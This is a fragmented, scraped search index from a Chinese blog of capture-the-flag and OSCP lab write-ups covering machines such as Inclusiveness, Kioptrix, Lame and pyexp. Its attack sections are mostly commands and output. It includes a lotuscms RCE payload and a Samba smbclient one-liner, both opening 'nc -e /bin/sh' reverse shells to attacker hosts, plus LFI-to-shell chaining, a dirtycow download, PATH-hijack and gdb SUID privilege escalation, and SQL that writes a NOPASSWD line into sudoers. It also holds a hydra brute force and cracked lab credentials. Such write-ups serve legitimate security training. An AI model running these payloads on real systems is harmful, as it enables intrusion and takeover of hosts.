\u0026#39;s/password[[:space:]]\\+\\(.*\\)[[:space:]]\\+\\(.*\\)$/password xxxxxx/g\u0026#39; \u0026gt; \\\r/var/backups/dpkg.status.0:Depends: passwd, debconf (\u0026gt;= 0.5) | debconf-2.0\r[+] Finding possible password variables inside key folders (limit 140)\r[+] Finding possible password in config files\r/etc/reportbug.conf password for SMTP\rpasswd XXX\r/etc/debconf.conf\rpasswords.\rpassword\rpasswords.\rpasswords\rpassword\rpasswords.dat\rpasswords and one for everything else.\rpasswords\rpassword is really\rPasswd: secret\r/etc/adduser.conf\rpasswd\r/etc/apache2/apache2.conf\rpasswd files from being\r/etc/nsswitch.conf\rpasswd: files systemd\r[+] Finding \u0026#39;username\u0026#39; string inside key folders (limit 70)\r[+] Searching specific hashes inside files - less false positives (limit 70) gdb -nx -ex \u0026#39;python import os; os.execl (\u0026#34;/bin/sh\u0026#34;, \u0026#34;sh\u0026#34;, \u0026#34;-p\u0026#34;)\u0026#39; -ex quit ","permalink":"https://netuseradministrator.github.io/zh/posts/hackthebox/gaara/","summary":"┌──(root㉿kali)-[~/桌面/vpn] └─# nmap -sS -sV -A --min-rate 5000 -p- 192.168.213.142 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-18 09:16 CST Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 5.58% done; ETC: 09:16 (0:00:17 remaining)","title":""},{"content":"┌──(root💀Chinchin)-[~/桌面/vpn]\r└─# nmap -sS -A -sC -sV -p- --min-rate 5000 192.168.189.14\rStarting Nmap 7.93 ( https://nmap.org ) at 2023-05-20 17:59 CST\rNmap scan report for 192.168.189.14\rHost is up (0.27s latency).\rNot shown: 65532 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r21/tcp open ftp vsftpd 3.0.3\r| ftp-syst: | STAT: | FTP server status:\r| Connected to ::ffff:192.168.45.174\r| Logged in as ftp\r| TYPE: ASCII\r| No session bandwidth limit\r| Session timeout in seconds is 300\r| Control connection is plain text\r| Data connections will be plain text\r| At session startup, client count was 2\r| vsFTPd 3.0.3 - secure, fast, stable\r|_End of status\r| ftp-anon: Anonymous FTP login allowed (FTP code 230)\r|_drwxrwxrwx 2 0 0 4096 Feb 08 2020 pub [NSE: writeable]\r22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)\r| ssh-hostkey: | 2048 061ba39283a57a15bd406e0c8d98277b (RSA)\r| 256 cb3883261a9fd35dd3fe9ba1d3bcab2c (ECDSA)\r|_ 256 6554fc2d12ace184783e0023fbe4c9ee (ED25519)\r80/tcp open http Apache httpd 2.4.38 ((Debian))\r|_http-title: Apache2 Debian Default Page: It works\r|_http-server-header: Apache/2.4.38 (Debian)\rAggressive OS guesses: Linux 4.4 (91%), Linux 3.10 - 3.12 (90%), Linux 4.9 (89%), Linux 4.0 (88%), Linux 3.10 - 3.16 (88%), Linux 3.11 - 4.1 (87%), Linux 2.6.32 (87%), Linux 3.5 (87%), Linux 4.2 (87%), Synology DiskStation Manager 5.1 (87%)\rNo exact OS matches for host (test conditions non-ideal).\rNetwork Distance: 4 hops\rService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\rTRACEROUTE (using port 3306/tcp)\rHOP RTT ADDRESS\r1 260.61 ms 192.168.45.1\r2 260.69 ms 192.168.45.254\r3 261.48 ms 192.168.251.1\r4 261.66 ms 192.168.189.14\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 60.71 seconds ===============================================================\r2023/05/20 18:23:23 Starting gobuster in directory enumeration mode\r===============================================================\rhttp://192.168.189.14/.php (Status: 403) [Size: 279]\rhttp://192.168.189.14/manual (Status: 200) [Size: 626]\rhttp://192.168.189.14/javascript (Status: 403) [Size: 279]\rhttp://192.168.189.14/robots.txt (Status: 200) [Size: 59] 访问robots.txt,提示不是search engine。尝试下变换user-agent为baidu，可以正常访问了\nhttp://192.168.189.14//secret_information/?lang=en.php 可能存在本地文件包含，尝试传参../../../../etc/passwd,成功读取到文件\n结合ftp匿名传输上传eval.php到/pub/eval.php\n通过LFI读取ftp配置\nhttp://192.168.189.14//secret_information/?lang=../../../../etc/vsftpd.conf 配置文件末尾写了一句\nanon_root=/var/ftp/ write_enable=YES # 尝试构造payload，通过文件包含运行刚刚上传的eval.php,同时监听端口接收shell\n┌──(root💀Chinchin)-[~/桌面/vpn]\r└─# nc -lvnp 1234 listening on [any] 1234 ...\rcurl 192.168.189.14//secret_information/?lang=/var/ftp/pub/eval.php ┌──(root💀Chinchin)-[~/桌面/vpn]\r└─# nc -lvnp 1234 listening on [any] 1234 ...\rconnect to [192.168.45.174] from (UNKNOWN) [192.168.189.14] 41140\rLinux inclusiveness 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64 GNU/Linux\r00:53:49 up 16 min, 0 users, load average: 0.00, 0.00, 0.00\rUSER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT\ruid=33(www-data) gid=33(www-data) groups=33(www-data)\r/bin/sh: 0: can\u0026#39;t access tty; job control turned off\r$ which python\r/usr/bin/python\r$ $ which python3\r/usr/bin/python3\r$ ^?^?python3 -c \u0026#39;import pty; pty.spawn (\u0026#34;/bin/bash\u0026#34;)\u0026#39;\r/bin/sh: 4: python3: not found\r$ python3 -c \u0026#39;import pty; pty.spawn (\u0026#34;/bin/bash\u0026#34;)\u0026#39;\rwww-data@inclusiveness:/$ ls ls\rbin home lib32 media root sys vmlinuz\rboot initrd.img lib64 mnt run tmp vmlinuz.old\rdev initrd.img.old libx32 opt sbin usr\retc lib lost+found proc srv var\rwww-data@inclusiveness:/$ cd /home\rcd /home\rwww-data@inclusiveness:/home$ ls\rls\rtom\rwww-data@inclusiveness:/home$ cd tom\rcd tom\rwww-data@inclusiveness:/home/tom$ ls\rls\rDesktop Downloads Pictures Templates local.txt rootshell.c\rDocuments Music Public Videos rootshell\rwww-data@inclusiveness:/home/tom$ cat local.txt\rcat local.txt\r0fb779bbe3be4b5dae5413c2969fdc0d find / -perm -4000 2\u0026gt;/dev/null\rcat rootshell.c int main() {\rprintf(\u0026#34;checking if you are tom...\\n\u0026#34;);\rFILE* f = popen(\u0026#34;whoami\u0026#34;, \u0026#34;r\u0026#34;);\rchar user[80];\rfgets(user, 80, f);\rprintf(\u0026#34;you are: %s\\n\u0026#34;, user);\r//printf(\u0026#34;your euid is: %i\\n\u0026#34;, geteuid());\rif (strncmp(user, \u0026#34;tom\u0026#34;, 3) == 0) {\rprintf(\u0026#34;access granted.\\n\u0026#34;);\rsetuid(geteuid());\rexeclp(\u0026#34;sh\u0026#34;, \u0026#34;sh\u0026#34;, (char *) 0);\r}\r} www-data@inclusiveness:/home/tom$ cd /tmp\rcd /tmp\rwww-data@inclusiveness:/tmp$ echo \u0026#34;printf \u0026#34;tom\u0026#34;\u0026#34; \u0026gt; whoami\recho \u0026#34;printf \u0026#34;tom\u0026#34;\u0026#34; \u0026gt; whoami\rwww-data@inclusiveness:/tmp$ chmod 777 whoami\rchmod 777 whoami\rwww-data@inclusiveness:/tmp$ export PATH=/tmp:$PATH\rexport PATH=/tmp:$PATH\rwww-data@inclusiveness:/tmp$ echo $PATH\recho $PATH\r/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\rwww-data@inclusiveness:/tmp$ cd /home/tom\rcd /home/tom\rwww-data@inclusiveness:/home/tom$ ./rootshell\r./rootshell\rchecking if you are tom...\ryou are: tom\raccess granted.\r# ","permalink":"https://netuseradministrator.github.io/zh/posts/hackthebox/inclusiveness/","summary":"┌──(root💀Chinchin)-[~/桌面/vpn] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 192.168.189.14 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-20 17:59 CST Nmap scan report for 192.168.189.14 Host is up (0.27s latency). Not shown: 65532 closed tcp ports (reset) PORT STATE","title":""},{"content":" 安装好，虚拟机使用桥接模式，和物理机划分到同一个网段。\nkali运行arp-scan -l 扫描同网络上的所有主机，确定靶机的ip。端口探测后生成报告 查看80端口web服务 使用的是lotuscms，搜索了历史版本的漏洞，有一个公开了的RCE，payload如下\nPOST /index.php HTTP/1.1\rHost: 192.168.3.115\rContent-Length: 0\rContent-Type: application/x-www-form-urlencoded\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36\rpage=index\u0026#39;);${system(\u0026#39;nc -e /bin/sh 192.168.3.201 12345\u0026#39;)};#\u0026#34; 漏洞成因是代码里使用了eval函数，后续的system函数会执行恶意的命令，从eval函数的代码执行到远程命令执行\n读取gconfig.php\n\u0026lt;?php\rerror_reporting(0);\r/*\rA sample Gallarific configuration file. You should edit\rthe installer details below and save this file as gconfig.php\rDo not modify anything else if you don\u0026#39;t know what it is.\r*/\r// Installer Details -----------------------------------------------\r// Enter the full HTTP path to your Gallarific folder below,\r// such as http://www.yoursite.com/gallery\r// Do NOT include a trailing forward slash\r$GLOBALS[\u0026#34;gallarific_path\u0026#34;] = \u0026#34;http://kioptrix3.com/gallery\u0026#34;;\r$GLOBALS[\u0026#34;gallarific_mysql_server\u0026#34;] = \u0026#34;localhost\u0026#34;;\r$GLOBALS[\u0026#34;gallarific_mysql_database\u0026#34;] = \u0026#34;gallery\u0026#34;;\r$GLOBALS[\u0026#34;gallarific_mysql_username\u0026#34;] = \u0026#34;root\u0026#34;;\r$GLOBALS[\u0026#34;gallarific_mysql_password\u0026#34;] = \u0026#34;fuckeyou\u0026#34;;\r// Setting Details -------------------------------------------------\rif(!$g_mysql_c = @mysql_connect($GLOBALS[\u0026#34;gallarific_mysql_server\u0026#34;], $GLOBALS[\u0026#34;gallarific_mysql_username\u0026#34;], $GLOBALS[\u0026#34;gallarific_mysql_password\u0026#34;])) {\recho(\u0026#34;A connection to the database couldn\u0026#39;t be established: \u0026#34; . mysql_error());\rdie();\r}else {\rif(!$g_mysql_d = @mysql_select_db($GLOBALS[\u0026#34;gallarific_mysql_database\u0026#34;], $g_mysql_c)) {\recho(\u0026#34;The Gallarific database couldn\u0026#39;t be opened: \u0026#34; . mysql_error());\rdie();\r}else {\r$settings=mysql_query(\u0026#34;select * from gallarific_settings\u0026#34;);\rif(mysql_num_rows($settings)!=0){\rwhile($data=mysql_fetch_array($settings)){\r$GLOBALS[\u0026#34;{$data[\u0026#39;settings_name\u0026#39;]}\u0026#34;]=$data[\u0026#39;settings_value\u0026#39;];\r}\r}\r}\r}\r?\u0026gt; 拿到shell后，wget下载脏牛提权\n成功添加用户，并添加到root组\nssh登录。用脏牛提权生成的账号firefart登录，获取到root权限，通关\n","permalink":"https://netuseradministrator.github.io/zh/posts/hackthebox/kioptrix-level-1.2-#3/","summary":"安装好，虚拟机使用桥接模式，和物理机划分到同一个网段。 kali运行arp-scan -l 扫描同网络上的所有主机，确定靶机的ip。端口探测后生成报","title":""},{"content":"python -c \u0026#39;import pty; pty.spawn (\u0026#34;/bin/sh\u0026#34;)\u0026#39;\recho os.system (\u0026#39;/bin/bash\u0026#39;)\r/bin/sh -i\rperl —e \u0026#39;exec \u0026#34;/bin/sh\u0026#34;;\u0026#39;\rperl: exec \u0026#34;/bin/sh\u0026#34;;\rruby: exec \u0026#34;/bin/sh\u0026#34;\rlua: os.execute (\u0026#39;/bin/sh\u0026#39;)\rexec \u0026#34;/bin/sh\u0026#34; 先贴上一些常用的从受限制shell逃逸的命令，大部分命令是利用主机上安装的脚本语言，来运行一些命令执行的函数，如python的os.system()，lua的os.exec()函数，利用函数运行/bin/bash或/bin/sh等shell应用，切换到无限制shell。\nselect sys_exec(\u0026#39;rm -r /etc/sudoers\u0026#39;);\rselect sys_exec(\u0026#39;chmod 0440 /etc/sudoers\u0026#39;);\rselect sys_exec(\u0026#39;echo \u0026#34;john ALL=(ALL) NOPASSWD: ALL\u0026#34; \u0026gt;\u0026gt; /etc/sudoers\u0026#39;); sql注入获得数据库权限，利用自建函数，sys_exec 将用户john加入超级用户文件sudoers ","permalink":"https://netuseradministrator.github.io/zh/posts/hackthebox/kioptrix-level-1.3-#4/","summary":"python -c \u0026#39;import pty; pty.spawn (\u0026#34;/bin/sh\u0026#34;)\u0026#39; echo os.system (\u0026#39;/bin/bash\u0026#39;) /bin/sh -i perl —e \u0026#39;exec \u0026#34;/bin/sh\u0026#34;;\u0026#39; perl: exec \u0026#34;/bin/sh\u0026#34;; ruby: exec \u0026#34;/bin/sh\u0026#34; lua: os.execute (\u0026#39;/bin/sh\u0026#39;) exec \u0026#34;/bin/sh\u0026#34; 先贴上一些常用的从受限制shell逃逸的命令，大部分命令是利用主机上安装的脚本语言，来","title":""},{"content":"nmap -sV -vv -sT --script vuln 10.129.192.173 \u0026gt; res.txt 2\u0026gt;\u0026amp;1 PORT STATE SERVICE REASON VERSION\r21/tcp open ftp syn-ack ttl 63 vsftpd 2.3.4\r22/tcp open ssh syn-ack ttl 63 OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)\r139/tcp open netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\r445/tcp open netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\rService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel 发现开放了21，22，139，445端口。这里补充一个nmap的技巧，当我们想要更深入了解某一个服务的版本，比方说smb的服务版本。可以使用 ls /usr/share/nmap/scripts|grep {service name} 我这里看了writeup使用了smb-enum-shares吗，正常的情况下应该对每一种可能出现漏洞的服务进行漏洞扫描。（比如vsftpd,openssh等等其他的服务，都需要仔细地对可能出现漏洞的每一个服务信息收集） Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-29 11:10 CST\rStats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan\rNSE Timing: About 0.00% done\rStats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan\rNSE Timing: About 0.00% done\rStats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan\rNSE Timing: About 0.00% done\rStats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan\rNSE Timing: About 0.00% done\rNmap scan report for 10.129.119.38\rHost is up (0.24s latency).\rPORT STATE SERVICE\r445/tcp open microsoft-ds\rHost script results:\r| smb-enum-shares: | account_used: \u0026lt;blank\u0026gt;\r| \\\\10.129.119.38\\ADMIN$: | Type: STYPE_IPC\r| Comment: IPC Service (lame server (Samba 3.0.20-Debian))\r| Users: 1\r| Max Users: \u0026lt;unlimited\u0026gt;\r| Path: C:\\tmp\r| Anonymous access: \u0026lt;none\u0026gt;\r| \\\\10.129.119.38\\IPC$: | Type: STYPE_IPC\r| Comment: IPC Service (lame server (Samba 3.0.20-Debian))\r| Users: 1\r| Max Users: \u0026lt;unlimited\u0026gt;\r| Path: C:\\tmp\r| Anonymous access: READ/WRITE\r| \\\\10.129.119.38\\opt: | Type: STYPE_DISKTREE\r| Comment: | Users: 1\r| Max Users: \u0026lt;unlimited\u0026gt;\r| Path: C:\\tmp\r| Anonymous access: \u0026lt;none\u0026gt;\r| \\\\10.129.119.38\\print$: | Type: STYPE_DISKTREE\r| Comment: Printer Drivers\r| Users: 1\r| Max Users: \u0026lt;unlimited\u0026gt;\r| Path: C:\\var\\lib\\samba\\printers\r| Anonymous access: \u0026lt;none\u0026gt;\r| \\\\10.129.119.38\\tmp: | Type: STYPE_DISKTREE\r| Comment: oh noes!\r| Users: 1\r| Max Users: \u0026lt;unlimited\u0026gt;\r| Path: C:\\tmp\r|_ Anonymous access: READ/WRITE\rNmap done: 1 IP address (1 host up) scanned in 106.91 seconds 启动msfconsole，search Samba 3.0.20-Debian，没有结果。扩大搜索范围search Samba 3.0.20，找到对应漏洞利用模块。拿到靶机shell。 将shell升级为交互式shell，使用以下模块\nuse post/multi/manage/shell_to_meterpreter\rsessions -l set session 1\rrun\rcat /home/makis/user.txt\rcat /root/root.txt 总结：信息收集阶段一定要仔细，对每一个端口上运行的程序，程序的版本都要作记录。因为后续漏洞发现阶段需要用到程序的版本信息。附上不使用msf的漏洞利用命令 smbclient -U “/=\\`nohup nc -e /bin/sh LHOST LPORT\\`” -N -I target_ip ","permalink":"https://netuseradministrator.github.io/zh/posts/hackthebox/lame/","summary":"nmap -sV -vv -sT --script vuln 10.129.192.173 \u0026gt; res.txt 2\u0026gt;\u0026amp;1 PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack ttl 63 vsftpd 2.3.4 22/tcp open ssh syn-ack ttl 63 OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) 139/tcp open netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel 发现","title":""},{"content":"","permalink":"https://netuseradministrator.github.io/zh/posts/hackthebox/loly/","summary":"","title":""},{"content":"信息收集 nmap -sS -A -sC -sV -p- --min-rate 5000 ┌──(root💀Chinchin)-[~/桌面/htb]\r└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.129.85.115\rStarting Nmap 7.93 ( https://nmap.org ) at 2023-05-03 00:39 CST\rStats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 30.04% done; ETC: 00:40 (0:00:16 remaining)\rStats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 32.83% done; ETC: 00:40 (0:00:16 remaining)\rStats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 34.15% done; ETC: 00:40 (0:00:15 remaining)\rStats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 35.46% done; ETC: 00:40 (0:00:16 remaining)\rStats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 37.07% done; ETC: 00:40 (0:00:15 remaining)\rStats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 38.10% done; ETC: 00:40 (0:00:16 remaining)\rNmap scan report for 10.129.85.115\rHost is up (0.44s latency).\rNot shown: 65533 filtered tcp ports (no-response)\rPORT STATE SERVICE VERSION\r80/tcp open http Apache httpd 2.4.18 ((Ubuntu))\r|_http-server-header: Apache/2.4.18 (Ubuntu)\r|_http-title: Site doesn\u0026#39;t have a title (text/html).\r443/tcp open ssl/http Apache httpd 2.4.18 ((Ubuntu))\r|_http-title: Site doesn\u0026#39;t have a title (text/html).\r|_http-server-header: Apache/2.4.18 (Ubuntu)\r|_ssl-date: TLS randomness does not represent time\r| tls-alpn: |_ http/1.1\r| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR\r| Not valid before: 2017-07-01T15:03:30\r|_Not valid after: 2018-07-01T15:03:30\rWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\rAggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%), Linux 4.4 (92%)\rNo exact OS matches for host (test conditions non-ideal).\rNetwork Distance: 2 hops\rTRACEROUTE (using port 80/tcp)\rHOP RTT ADDRESS\r1 476.09 ms 10.10.16.1\r2 476.19 ms 10.129.85.115\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 77.50 seconds gobuster dir --url https://10.129.85.115/ -w /usr/share/wordlists/dirb/small.txt -e -k -r ","permalink":"https://netuseradministrator.github.io/zh/posts/hackthebox/nineveh/","summary":"信息收集 nmap -sS -A -sC -sV -p- --min-rate 5000 ┌──(root💀Chinchin)-[~/桌面/htb] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.129.85.115 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-03 00:39 CST Stats: 0:00:08 elapsed; 0 hosts completed (1","title":""},{"content":" \u0026lt;?php print $_POST[\u0026lsquo;ip\u0026rsquo;]; if (isset($_POST[\u0026lsquo;submit\u0026rsquo;])){ $target = $_REQUEST[ \u0026lsquo;ip\u0026rsquo; ]; echo \u0026lsquo;\u0026rsquo;; echo shell_exec( \u0026lsquo;ping -c 3 \u0026rsquo; . $target ); echo \u0026lsquo;\u0026rsquo;; } ?\u0026gt; ","permalink":"https://netuseradministrator.github.io/zh/posts/hackthebox/oscp%E9%9D%B6%E5%9C%BA/","summary":"\u0026lt;?php print $_POST[\u0026lsquo;ip\u0026rsquo;]; if (isset($_POST[\u0026lsquo;submit\u0026rsquo;])){ $target = $_REQUEST[ \u0026lsquo;ip\u0026rsquo; ]; echo \u0026lsquo;\u0026rsquo;; echo shell_exec( \u0026lsquo;ping -c 3 \u0026rsquo; . $target ); echo \u0026lsquo;\u0026rsquo;; } ?\u0026gt;","title":""},{"content":"┌──(root💀Chinchin)-[~/桌面/vpn]\r└─# nmap -sS -A -sC -sV -p- --min-rate 5000 192.168.195.118 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-21 11:10 CST\rNmap scan report for 192.168.195.118\rHost is up (0.24s latency).\rNot shown: 65533 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r1337/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\r| ssh-hostkey: | 2048 f7af6cd12694dce51a221a644e1c34a9 (RSA)\r| 256 46d28dbd2f9eafcee2455ca612c0d919 (ECDSA)\r|_ 256 8d11edff7dc5a72499227fce2988b24a (ED25519)\r3306/tcp open mysql MySQL 5.5.5-10.3.23-MariaDB-0+deb10u1\r| mysql-info: | Protocol: 10\r| Version: 5.5.5-10.3.23-MariaDB-0+deb10u1\r| Thread ID: 39\r| Capabilities flags: 63486\r| Some Capabilities: FoundRows, InteractiveClient, IgnoreSpaceBeforeParenthesis, Support41Auth, Speaks41ProtocolOld, SupportsTransactions, Speaks41ProtocolNew, IgnoreSigpipes, SupportsLoadDataLocal, ConnectWithDatabase, DontAllowDatabaseTableColumn, LongColumnFlag, SupportsCompression, ODBCClient, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults\r| Status: Autocommit\r| Salt: =|{v_UnKkY[=^@gdB\\)T\r|_ Auth Plugin Name: mysql_native_password\rNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\rTCP/IP fingerprint:\rOS:SCAN(V=7.93%E=4%D=5/21%OT=1337%CT=1%CU=30941%PV=Y%DS=4%DC=T%G=Y%TM=64698\rOS:BD4%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%II=I%TS=A)OPS(O1\rOS:=M551ST11NW7%O2=M551ST11NW7%O3=M551NNT11NW7%O4=M551ST11NW7%O5=M551ST11NW\rOS:7%O6=M551ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=\rOS:Y%DF=Y%T=40%W=FAF0%O=M551NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%R\rOS:D=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q\rOS:=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=\rOS:9289%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\rNetwork Distance: 4 hops\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rTRACEROUTE (using port 1723/tcp)\rHOP RTT ADDRESS\r1 259.85 ms 192.168.45.1\r2 259.87 ms 192.168.45.254\r3 261.28 ms 192.168.251.1\r4 261.43 ms 192.168.195.118\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 48.99 seconds hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.195.118 爆破出mysql的密码root:prettywoman\nmysql -h 192.168.195.118 -u root -p\rprettywoman MariaDB [data]\u0026gt; select * from fernet;\r+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+\r| cred | keyy |\r+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+\r| gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys= | UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0= |\r+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+ 参考了一下资料，使用了fetnet模块进行加密，问问gpt解密脚本怎么写\nfrom cryptography.fernet import Fernet\r# 加密后的密文和 key（这里只是示例，请替换为自己的实际值）\rencrypted_message = b\u0026#39;gAAAAABd7sR0...liMBiH07v8=\u0026#39;\rkey = b\u0026#39;eJdYD9jHjJTZVVo...K0wE=\u0026#39;\r# 创建 Fernet 对象并使用 key 进行解密\rf = Fernet(key)\rdecrypted_message = f.decrypt(encrypted_message)\r# 打印解密后的明文\rprint(decrypted_message.decode()) 获得明文lucy:wJ9`\u0026ldquo;Lemdv9[FEw-\nssh lucy@192.168.195.118 -p 1337\rwJ9`\u0026#34;Lemdv9[FEw- 提权，看看sudo -l\nlucy@pyexp:~$ sudo -l\rMatching Defaults entries for lucy on pyexp:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\rUser lucy may run the following commands on pyexp:\r(root) NOPASSWD: /usr/bin/python2 /opt/exp.py lucy@pyexp:~$ cat /opt/exp.py\ruinput = raw_input(\u0026#39;how are you?\u0026#39;)\rexec(uinput) 终于遇到个能看懂的了\nexec()函数会把参数作为python代码执行，通过raw_input()输入\nimport pty; pty.spawn (\u0026#34;/bin/bash\u0026#34;) ","permalink":"https://netuseradministrator.github.io/zh/posts/hackthebox/pyexp/","summary":"┌──(root💀Chinchin)-[~/桌面/vpn] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 192.168.195.118 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-21 11:10 CST Nmap scan report for 192.168.195.118 Host is up (0.24s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE","title":""},{"content":"┌──(root💀Chinchin)-[~/桌面/htb]\r└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.129.85.125\rStarting Nmap 7.93 ( https://nmap.org ) at 2023-05-03 16:29 CST\rNmap scan report for 10.129.85.125\rHost is up (0.58s latency).\rNot shown: 65533 filtered tcp ports (no-response)\rPORT STATE SERVICE VERSION\r80/tcp open http lighttpd 1.4.35\r|_http-title: Did not follow redirect to https://10.129.85.125/\r|_http-server-header: lighttpd/1.4.35\r443/tcp open ssl/https?\r| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US\r| Not valid before: 2017-10-14T19:21:35\r|_Not valid after: 2023-04-06T19:21:35\r|_ssl-date: TLS randomness does not represent time\rWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\rDevice type: general purpose|specialized\rRunning (JUST GUESSING): OpenBSD 4.X (93%), Comau embedded (92%)\rOS CPE: cpe:/o:openbsd:openbsd:4.0\rAggressive OS guesses: OpenBSD 4.0 (93%), Comau C4G robot control unit (92%)\rNo exact OS matches for host (test conditions non-ideal).\rNetwork Distance: 2 hops\rTRACEROUTE (using port 443/tcp)\rHOP RTT ADDRESS\r1 797.66 ms 10.10.16.1\r2 797.81 ms 10.129.85.125\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 63.72 seconds ","permalink":"https://netuseradministrator.github.io/zh/posts/hackthebox/sense/","summary":"┌──(root💀Chinchin)-[~/桌面/htb] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.129.85.125 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-03 16:29 CST Nmap scan report for 10.129.85.125 Host is up (0.58s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE","title":""},{"content":"GNU Bash 4.3及之前版本在评估某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行Shell命令。某些服务和应用允许未经身份验证的远程攻击者提供环境变量以利用此漏洞。此漏洞源于在调用Bash Shell之前可以用构造的值创建环境变量。这些变量可以包含代码，在Shell被调用后会被立即执行。 nmap -vv -sV -sT -A 10.129.85.4 PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: Apache/2.4.18 (Ubuntu) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS 2222/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4f8ade8f80477decf150d630a187e49 (RSA) | ssh-rsa 